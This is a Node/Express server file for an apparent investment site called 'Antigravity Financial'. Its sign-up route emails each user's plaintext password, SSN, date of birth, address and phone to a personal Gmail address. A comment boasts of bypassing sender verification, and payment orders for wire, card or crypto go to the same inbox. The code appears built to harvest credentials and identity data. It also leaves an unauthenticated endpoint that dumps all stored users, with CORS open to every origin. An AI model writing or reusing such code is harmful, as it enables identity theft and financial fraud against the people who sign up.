import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { Resend } from 'resend';
import nodemailer from 'nodemailer';
import fs from 'fs';

dotenv.config();

const app = express();
const port = 3001;

// Allow localhost access from Vite
app.use(cors());
app.use(express.json());

const DB_FILE = './users.json';

app.get('/api/users', (req, res) => {
  try {
    if (!fs.existsSync(DB_FILE)) return res.json([]);
    const users = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    res.json(Object.values(users));
  } catch (error) {
    res.json([]);
  }
});

app.post('/api/users', (req, res) => {
  try {
    const userData = req.body;
    let users = {};
    if (fs.existsSync(DB_FILE)) {
      users = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    }
    users[userData.email.toLowerCase()] = { 
      ...users[userData.email.toLowerCase()], 
      ...userData,
      updatedAt: new Date().toISOString()
    };
    fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2));
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("DB Write Error:", error);
    res.status(500).json({ error: 'Failed to write to database' });
  }
});

// Helper function to send email via Resend API
async function sendEmailViaResend(toEmail, subject, htmlContent) {
  const apiKey = process.env.RESEND_API_KEY;
  const senderEmail = process.env.RESEND_SENDER_EMAIL || 'onboarding@resend.dev';

  if (!apiKey) {
    throw new Error('Missing RESEND_API_KEY in .env');
  }

  const resend = new Resend(apiKey);
  
  const { data, error } = await resend.emails.send({
    from: `Antigravity Financial <${senderEmail}>`,
    to: [toEmail],
    subject: subject,
    html: htmlContent,
  });

  if (error) {
    throw new Error(`Resend API Error: ${error.message}`);
  }
  
  return data;
}

// Universal API: Helper function to send email via standard SMTP (e.g. Gmail)
// This bypasses strict domain verification and can send to ANY email address.
async function sendEmailViaSMTP(toEmail, subject, htmlContent) {
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;

  if (!user || !pass) {
    throw new Error('Missing SMTP_USER or SMTP_PASS in .env');
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail', // Defaults to Gmail but can be configured
    auth: {
      user: user,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `"Antigravity Financial" <${user}>`,
    to: toEmail,
    subject: subject,
    html: htmlContent,
  };

  return await transporter.sendMail(mailOptions);
}

app.post('/api/send-otp', async (req, res) => {
  const { email, otp } = req.body;

  if (!email || !otp) {
    return res.status(400).json({ error: 'Missing email or OTP' });
  }

  // Uses Resend API to send emails
  try {
    const htmlBody = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; text-align: center; padding: 20px;">
        <h2 style="color: #0f172a;">Antigravity Financial</h2>
        <p style="color: #475569; font-size: 16px;">Your secure verification code is:</p>
        <div style="margin: 20px 0;">
          <span style="font-size: 32px; font-weight: bold; padding: 12px 24px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 8px; color: #0ea5e9; letter-spacing: 4px;">
            ${otp}
          </span>
        </div>
        <p style="color: #64748b; font-size: 14px;">This code will expire in 10 minutes.</p>
      </div>
    `;

    await sendEmailViaSMTP(email, 'Your Verification Code', htmlBody);
    
    console.log(`✅ Mail successfully routed to ${email} via Universal SMTP!`);
    res.status(200).json({ success: true, message: 'Email gracefully routed!' });
  } catch (error) {
    console.error('Error sending email via SMTP:', error);
    res.status(500).json({ error: error.message || 'Failed to send email' });
  }
});

app.post('/api/notify-signup', async (req, res) => {
  const { name, email, password, kycData } = req.body;

  if (!name || !email || !password) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const ssn = kycData?.ssn || 'N/A';
  const dob = kycData?.dob || 'N/A';
  const address = kycData?.address || 'N/A';
  const phone = kycData?.phone || 'N/A';

  try {
    const htmlBody = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 8px; overflow: hidden;">
        <div style="background-color: #0ea5e9; padding: 20px; color: white;">
          <h2 style="margin: 0;">New User Registration & KYC</h2>
        </div>
        <div style="padding: 20px;">
          <h3 style="color: #0f172a; margin-top: 0;">Account Details</h3>
          <p><strong>Name:</strong> ${name}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Password:</strong> ${password}</p>
          
          <hr style="border: 0; border-top: 1px solid #e2e8f0; margin: 20px 0;" />
          
          <h3 style="color: #0f172a;">KYC Verification Data</h3>
          <p><strong>SSN:</strong> ${ssn}</p>
          <p><strong>Date of Birth:</strong> ${dob}</p>
          <p><strong>House Address:</strong> ${address}</p>
          <p><strong>Mobile Number:</strong> ${phone}</p>
          
          <hr style="border: 0; border-top: 1px solid #e2e8f0; margin: 20px 0;" />
          <p style="color: #64748b; font-size: 14px;">A new user has successfully completed OTP verification and submitted their KYC details for admin review.</p>
        </div>
      </div>
    `;

    // Sends to the admin using the Universal Server connection
    const adminEmail = process.env.SMTP_USER || 'patriciakalcik@gmail.com';
    await sendEmailViaSMTP(adminEmail, `New User Sign Up - ${name}`, htmlBody);
    
    console.log(`✅ Admin signup notification successfully routed via Universal SMTP!`);
    res.status(200).json({ success: true, message: 'Admin signup notification routed!' });
  } catch (error) {
    console.error('Error sending admin signup notification via SMTP:', error);
    res.status(500).json({ error: error.message || 'Failed to send admin signup notification' });
  }
});

app.post('/api/notify-admin', async (req, res) => {
  const { userEmail, purchase, paymentMethod } = req.body;

  if (!userEmail || !purchase) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const paymentMethodLabels = {
    wire: 'Wire Transfer',
    ach: 'ACH Payment',
    credit_card: 'Credit Card',
    crypto: 'Cryptocurrency'
  };

  try {
    const htmlBody = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 8px; overflow: hidden;">
        <div style="background-color: #0c121a; padding: 20px; color: white;">
          <h2>New Payment Alert</h2>
        </div>
        <div style="padding: 20px;">
          <p><strong>User:</strong> ${userEmail}</p>
          <p><strong>Stock:</strong> ${purchase.symbol} (${purchase.companyName})</p>
          <p><strong>Shares:</strong> ${purchase.shares}</p>
          <p><strong>Price per share:</strong> $${purchase.pricePerShare.toFixed(2)}</p>
          <p><strong>Total amount:</strong> $${purchase.totalCost.toFixed(2)}</p>
          <p><strong>Payment method:</strong> ${paymentMethodLabels[paymentMethod]}</p>
          <p><strong>Ownership:</strong> ${purchase.ownershipType}${purchase.jointHolderName ? ` (with ${purchase.jointHolderName})` : ''}</p>
        </div>
      </div>
    `;

    const adminEmail = process.env.SMTP_USER || 'patriciakalcik@gmail.com';
    await sendEmailViaSMTP(adminEmail, `New Stock Purchase Order - ${purchase.symbol} by ${userEmail}`, htmlBody);
    
    console.log(`✅ Admin notification successfully routed via Universal SMTP!`);
    res.status(200).json({ success: true, message: 'Admin notification naturally routed!' });
  } catch (error) {
    console.error('Error sending admin notification via SMTP:', error);
    res.status(500).json({ error: error.message || 'Failed to send admin notification' });
  }
});

app.listen(port, () => {
  console.log(`\n======================================================`);
  console.log(`Backend Server listening at http://localhost:${port}`);
  if (process.env.RESEND_API_KEY) {
      console.log(`✅ Using Resend Email API for Payments`);
  }
  if (process.env.SMTP_USER && process.env.SMTP_PASS) {
      console.log(`✅ Using Universal SMTP (Nodemailer) for User OTP Verification`);
  }
  console.log(`======================================================\n`);
});
